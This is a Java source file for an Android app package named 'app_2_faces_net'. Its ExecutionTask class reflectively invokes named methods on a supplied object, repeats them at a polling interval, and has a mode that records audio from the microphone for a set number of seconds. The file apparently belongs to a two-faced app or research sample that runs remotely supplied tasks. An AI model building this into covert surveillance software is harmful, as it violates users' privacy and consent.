package com.android.app_2_faces_net;

import android.content.Context;
import android.media.MediaRecorder;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.concurrent.Callable;

public class ExecutionTask implements Callable<String> {
    private static final long MS_1000 = 1000L;

    private final Context context;
    private final Object obj;
    private final String methodName;
    private final String resultType;
    private final String arg;
    private final int poolingTimeMs;

    private int reps;


    public ExecutionTask(Context context, Object obj, String methodName, String resultType, String arg, int reps, int poolingTimeMs) {
        this.context = context;
        this.obj = obj;
        this.methodName = methodName;
        this.resultType = resultType;
        this.arg = arg;
        this.reps = reps;
        this.poolingTimeMs = poolingTimeMs;
    }

    @Override
    public String call() throws InterruptedException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        if (reps == 0) {
            return "No execution";
        } else if (reps == 1) {
            return execute();
        } else {
            StringBuilder resultBuilder = new StringBuilder();
            while (this.reps > 0) {
                String executionResult = execute();

                resultBuilder.append(executionResult);
                resultBuilder.append(" | ");

                Thread.sleep(poolingTimeMs);
                this.reps--;
            }
            String result = resultBuilder.toString();
            return result.substring(0, result.length() - 3); //removing last | pipe
        }
    }

    private String execute() throws InterruptedException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        String executionResult = "";

        if (this.resultType.equals("Sound")) {
            Method firstMethod = obj.getClass().getDeclaredMethod("run", Context.class);
            MediaRecorder recorder = (MediaRecorder) firstMethod.invoke(obj, this.context);

            Thread.sleep(Integer.parseInt(arg) * MS_1000);

            Method secondMethod = obj.getClass().getDeclaredMethod("stop", MediaRecorder.class, Context.class);
            executionResult = (String) secondMethod.invoke(obj, recorder, this.context);
        } else {
            Method method = this.obj.getClass().getDeclaredMethod(this.methodName, Context.class, String.class);
            executionResult = (String) method.invoke(this.obj, this.context, this.arg);
        }

        return executionResult;
    }
}
